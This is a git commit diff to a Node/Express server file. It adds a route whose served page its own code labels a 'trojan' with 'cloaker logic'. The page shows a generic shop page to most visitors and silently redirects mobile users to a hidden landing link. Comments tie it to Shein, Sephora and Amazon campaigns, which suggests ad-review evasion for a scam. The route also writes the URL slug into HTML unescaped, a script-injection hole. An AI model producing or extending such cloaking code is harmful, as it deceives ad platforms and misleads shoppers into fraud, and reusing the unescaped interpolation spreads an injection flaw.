2b9bc3793c0707b4255a0b2c36db189f60f1cdfe
RecaTT2024 <167359180+RecaTT2024@users.noreply.github.com>
2024-05-04 23:30:02 +0200

    Update server.js

--- server.js
+++ server.js
@@ -105,6 +105,39 @@ app.get('/sephora/:slug', (req, res, next) => {
             console.log(`Served shein Trojan (maxconvtest)(${slug})`);
 });
 
+// Middleware to pass on my slug values (SHEIN US CAMP)
+app.get('/amazon/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `PUT AMAZON LINK HERE`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served shein Trojan (${slug})`);
+});
+
 // Start the HTTP server
 const PORT = 8080;
 app.listen(PORT, () => {
